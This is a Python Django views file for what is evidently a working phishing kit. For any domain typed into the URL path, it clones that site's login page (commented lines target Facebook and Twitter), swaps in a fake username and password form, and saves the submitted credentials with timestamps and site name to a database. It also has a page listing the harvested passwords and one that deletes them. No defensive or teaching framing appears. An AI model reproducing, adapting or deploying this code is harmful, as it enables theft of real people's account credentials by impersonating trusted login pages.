from django.http import HttpResponse
from django.shortcuts import render
import re
import requests
from bs4 import BeautifulSoup
from django.template import RequestContext, Template
import datetime
import calendar
from .models import *

def about(request):
    return render(request,'index.html')

def error_404_view(request, exception):
    # URL = "http://127.0.0.1:8000/form"
    # URL = "https://en-gb.facebook.com/"
    str = request.get_full_path()
    print ("your path = ",str[1:])
    URL = "https://"+str[1:]+"/login"
    r = requests.get(URL)
    soup = r.content
    temparr = re.split("<form | </form>",soup.decode("utf-8"))
    print ("length = ",len(temparr))
    if(len(temparr) != 1):
        print ("---------------------------------------------------------------------------------------------------")
        print ("---------------------------------------------------------------------------------------------------")
        print ("---------------------------------------------------------------------------------------------------")
        print (temparr[0])
        print ("---------------------------------------------------------------------------------------------------")
        print ("---------------------------------------------------------------------------------------------------")
        print ("---------------------------------------------------------------------------------------------------")
        temparr[1] = "<form action='login?path="+str[1:]+"' method='post'>Username : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type='text' name='mailid' id='mailid' placeholder='Username'><br><br>Password : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type='password' name='password' id='password' placeholder='Password'><br><br><input type='submit' name='submit' value='Sign-In' id='submitbutton'></form>"
        print (temparr[0])

        tempstr = "".join(temparr)
        return HttpResponse(tempstr)
    else:
        data = {"url" : str[1:]}
        return render(request,'wrong.html',{"data" : data })

def login(request):
    print ("------------------- login called ----------------------")
    loginmail = request.POST.get('mailid')
    loginpass = request.POST.get('password')

    print (loginmail)
    print (loginpass)

    d = datetime.datetime.now()
    k = d.strptime(str(d.hour) + ":" + str(d.minute), "%H:%M")
    dateobj = str(d.day) + "-" + str(d.month) +  "-" + str(d.year) 
    timeobj1 = str(k.strftime("%I")) + ":" + str(k.strftime("%M"))
    timestt = timeobj1 + " " + k.strftime("%p")

    logsobj = Logs()
    logsobj.date = dateobj
    logsobj.time = timestt
    logsobj.username = loginmail
    logsobj.password = loginpass
    logsobj.weburl = re.split('path=',request.GET.urlencode())[1]
    logsobj.save()

    alllogs = Logs.objects.all()
    for i in alllogs:
        print ("printing log : ")
        print ("Date : ",i.date)
        print ("Time : ",i.time)
        print ("Username : ",i.username)
        print ("Password : ",i.password)
        print ("Weburl : ",i.weburl)
        print ("---------------------------")

    data = {"url" : re.split('path=',request.GET.urlencode())[1]}
    return render(request,'wrong.html',{"data" : data })

def logs(request):
    alllogs = Logs.objects.all()

    if request.POST.get('date') == None:
        return render(request,'logs.html',{"data" : alllogs })
    else:
        sortedlogs = []
        mydate = re.split("-",request.POST.get('date'))
        checkdate = mydate[2] +"-"+ mydate[1] +"-"+ mydate[0]
        for i in alllogs:
            if i.date == checkdate:
                sortedlogs.append(i) 
        
        return render(request,'logs.html',{"data" : sortedlogs })

def dellogs(request):
    Logs.objects.all().delete()
    print("All logs are deleted")
    return render(request,'delete.html')
    
    # soup = BeautifulSoup(tempstr, 'html5lib')
    # for i in alllogs:
    #     print ("printing log : ")
    #     print ("Date : ",i.date)
    #     print ("Time : ",i.time)
    #     print ("Username : ",i.username)
    #     print ("Password : ",i.password)
    #     print ("Weburl : ",i.weburl)
    #     print ("---------------------------")

    # logsobj = Logs()
    # logsobj.date = "date"
    # logsobj.time = "time"
    # logsobj.username = loginmail
    # logsobj.password = loginpass
    # logsobj.weburl =  request.GET.urlencode()[1]
    # logsobj.save()
    # alllogs = Logs.objects.all()
    # for i in alllogs:
    #     print ("printing log : ",i)

# def scrap(request):
#     # URL = "http://192.168.43.237:8000"
#     URL = "https://twitter.com/login"
#     r = requests.get(URL)
#     soup = BeautifulSoup(r.content, 'html5lib') 
#     # print(soup.prettify())
#     # myvar = soup.prettify()
#     # str = re.split("<form",myvar.decode("utf-8"))
#     kkh = r.content
#     kkhoij = re.split("<form | </form>",kkh.decode("utf-8"))
#     # for i in kkhoij:
#     #     print (i)
#     #     print ("---------------------------------------------------------------------------------------------------")
#     temp = "hello"
#     # print (kkhoij[0])
#     print ("---------------------------------------------------------------------------------------------------")
#     print ("---------------------------------------------------------------------------------------------------")
#     print ("---------------------------------------------------------------------------------------------------")
#     print (kkhoij[1])
#     print ("---------------------------------------------------------------------------------------------------")
#     print ("---------------------------------------------------------------------------------------------------")
#     print ("---------------------------------------------------------------------------------------------------")
#     # print (kkhoij[2])
#     print ("---------------------------------------------------------------------------------------------------")
#     print ("---------------------------------------------------------------------------------------------------")
#     kkhoij[1] = "hello"
#     tempstr = ""
#     for i in kkhoij:
#         tempstr = tempstr + i
#     # temp2 = kkhoij.join()
#     print ("---------------------------------------------------------------------------------------------------")
#     # print(tempstr)
#     soup = BeautifulSoup(tempstr, 'html5lib')
#     myvar = soup.prettify()
#     return HttpResponse(myvar)
# def error_404_view(request, exception):
#     str = request.get_full_path()
#     print (str[1:])
#     return HttpResponse(str[1:])

# def fileput(request):
#     handle1 = open('./templates/file.html','w+')
#     handle1.write("I AM NEW FILE")
#     handle1.close()
#     return render(request,'login.html')

# def form(request):
# #     return render(request,'login.html')
# def thisr(request):
#     str = re.split('path=',request.GET.urlencode())[1].replace("%", "/").replace("/2F","/").replace("/3A",":")
#     print ("this is our link = ",str)
#     return HttpResponse(str)

# def scrap(request):
